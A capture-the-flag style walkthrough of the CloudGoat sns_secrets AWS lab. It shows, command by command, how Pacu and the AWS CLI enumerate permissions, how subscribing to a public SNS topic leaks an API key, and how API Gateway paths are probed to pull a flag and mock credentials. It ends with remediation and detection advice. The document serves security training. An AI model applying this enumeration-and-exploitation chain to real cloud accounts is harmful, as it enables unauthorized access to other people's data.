
# CloudGoat Walkthrough: sns_secrets Scenario

## ⚡ TL;DR: Quick Summary

This CloudGoat `sns_secrets` scenario demonstrates how misconfigured SNS Topic policies and weak API Gateway security can lead to full data exfiltration. Key findings include:

- 📣 **Public SNS Topic**: The SNS topic allows anyone (Principal: `*`) to subscribe and receive messages.
- 📧 **Sensitive Data Leak via Email**: Subscription yields a debug email containing an API key.
- 🌐 **API Gateway Exposure**: The leaked API key grants access to an API Gateway endpoint that exposes sensitive user data and a flag.
- 🧪 **Attack Path**: SNS enumeration → public topic subscription → API key retrieval → API Gateway fuzzing → data exfiltration.

---

## 🎓 Learning Objectives

- Understand how insecure SNS policies can leak sensitive data.
- Practice API Gateway enumeration and exploitation.
- Learn how IAM policy misconfigurations create attack paths.
- Apply defense-in-depth strategies for AWS security.

---

## 🛠️ Initial Setup

### Scenario Creation

```bash
cloudgoat create sns_secrets
```

This sets up a vulnerable AWS environment designed to test misconfigurations in SNS and API Gateway usage.

### Provided Credentials

These were redacted for security:

```
Access Key ID:     [REDACTED]
Secret Access Key: [REDACTED]
```

Configure the AWS CLI profile:

```bash
aws configure --profile sns
```

Verify the credentials are working:

```bash
aws sts get-caller-identity --profile sns
```

Output (Partial):

```json
{
  "Account": "[REDACTED]",
  "Arn": "arn:aws:iam::[REDACTED]:user/cg-sns-user-<unique>"
}
```

---

## 🔎 Privilege Enumeration Using Pacu

Launch Pacu and import the session:

```bash
pacu
import_keys
```

Run the IAM permissions enumeration module:

```bash
run iam__enum_permissions
```

**Results**:

- 11 confirmed permissions, primarily related to SNS, IAM read access, and API Gateway.

Use `whoami` to view detailed access:

```json
"Allow": {
  "sns:subscribe": "*",
  "sns:receive": "*",
  "sns:listtopics": "*",
  "sns:listsubscriptionsbytopic": "*",
  "sns:gettopicattributes": "*",
  "iam:getuserpolicy": "*",
  "iam:listuserpolicies": "*",
  "iam:listgroupsforuser": "*",
  "iam:listattacheduserpolicies": "*",
  "apigateway:get": "*" (with explicit Deny for specific API Gateway resources)
}
```

---

## 📡 Discovering SNS Topics

Run the SNS enumeration module:

```bash
run sns__enum --region us-east-1
```

**Output**:

- Found 1 SNS topic.
- Topic ARN: `arn:aws:sns:us-east-1:[REDACTED]:public-topic-<unique>`
- Subscribers: 0

List topics directly via CLI:

```bash
aws sns list-topics --profile sns --region us-east-1
```

**Output**:

```json
{
  "Topics": [
    {
      "TopicArn": "arn:aws:sns:us-east-1:[REDACTED]:public-topic-<unique>"
    }
  ]
}
```

Get topic attributes:

```bash
aws sns get-topic-attributes --topic-arn arn:aws:sns:us-east-1:[REDACTED]:public-topic-<unique> --profile sns --region us-east-1
```

**Key Output**:

- The topic policy allows `sns:Subscribe`, `sns:Receive`, and `sns:ListSubscriptionsByTopic` to any principal (`*`).
- Policy shows no conditionals, so access is global.

### 🔥 Key Security Insight

```json
"Principal": "*",
"Action": [
  "sns:Subscribe",
  "sns:Receive",
  "sns:ListSubscriptionsByTopic"
]
```

This means **anyone can subscribe and view subscriptions** on this topic.

---

## 📬 Exploiting Public SNS Topic

Subscribe to the topic:

```bash
aws sns subscribe   --topic-arn arn:aws:sns:us-east-1:[REDACTED]:public-topic-<unique>   --protocol email   --notification-endpoint you@example.com   --profile sns --region us-east-1
```

**Result**: You receive an email. Inside is a secret debug API key (**redacted**).

---

## 🌐 API Gateway Enumeration

Run the module:

```bash
run apigateway__enum --region us-east-1
```

**Output**:

- Found API with ID: `<api-id>`
- Errors due to `AccessDeniedException`, but disclosed path hints.

Test the API endpoint:

```bash
curl -H "x-api-key: [REDACTED]" https://<api-id>.execute-api.us-east-1.amazonaws.com/flag
```

**Response**:

```json
{"message":"Forbidden"}
```

Indicates the gateway exists and key is valid.

Get stages:

```bash
aws apigateway get-stages --rest-api-id <api-id> --region us-east-1 --profile sns
```

**Output**:

- `stageName`: `prod-<unique>`

Test with full path:

```bash
curl -H "x-api-key: [REDACTED]" https://<api-id>.execute-api.us-east-1.amazonaws.com/prod-<unique>
```

**Response**:

```json
{"message":"Missing Authentication Token"}
```

Means the endpoint is valid but the path is incomplete.

Get resources:

```bash
aws apigateway get-resources --rest-api-id <api-id> --region us-east-1 --profile sns
```

**Output**:

```json
"path": "/user-data"
"resourceMethods": {
  "GET": {}
}
```

Now test the final API:

```bash
curl -H "x-api-key: [REDACTED]" https://<api-id>.execute-api.us-east-1.amazonaws.com/prod-<unique>/user-data
```

**Final Output**:

```json
{
  "final_flag": "FLAG{SNS_S3cr3ts_ar3_FUN}",
  "message": "Access granted",
  "user_data": {
    "email": "SuperAdmin@notarealemail.com",
    "password": "p@ssw0rd123",
    "user_id": "1337",
    "username": "SuperAdmin"
  }
}
```

---

## 🛡️ Remediations

- **Restrict SNS Topic Policies**:
  - Avoid using `"Principal": "*"` in SNS topic policies.
  - Apply least-privilege principle and allow only trusted accounts.

- **Limit IAM Permissions**:
  - Do not allow excessive wildcard permissions (`sns:*`, `apigateway:*`).
  - Monitor and audit IAM user access with tools like AWS IAM Access Analyzer.

- **Use Conditional Access Controls**:
  - Use conditions in IAM policies (like `SourceIp`, `aws:PrincipalOrgId`) to restrict access.

- **Rotate Secrets & API Keys**:
  - Audit and rotate keys regularly.
  - Store secrets in AWS Secrets Manager.

- **Log & Monitor**:
  - Enable CloudTrail logging for SNS and API Gateway actions.
  - Set up GuardDuty to alert on suspicious activity.

- **Use Resource-Based Policies with Caution**:
  - Always validate the impact of public-facing resources in AWS services.

- **Email Verification for SNS Subscriptions**:
  - Monitor SNS subscriptions and investigate unfamiliar endpoints.

- **Audit API Gateway Resources**:
  - Avoid exposing sensitive APIs without proper authentication and authorization layers.

---

## 🕵️ Detection Opportunities

- Monitor CloudTrail for `sns:Subscribe` actions from unknown principals.
- Alert on `x-api-key` usage from unusual IPs or patterns.
- Watch for enumeration behavior in API Gateway logs (e.g., path fuzzing).
- Identify email-based SNS subscriptions to disposable or external domains.
- Correlate unusual SNS activity with IAM or API Gateway events.
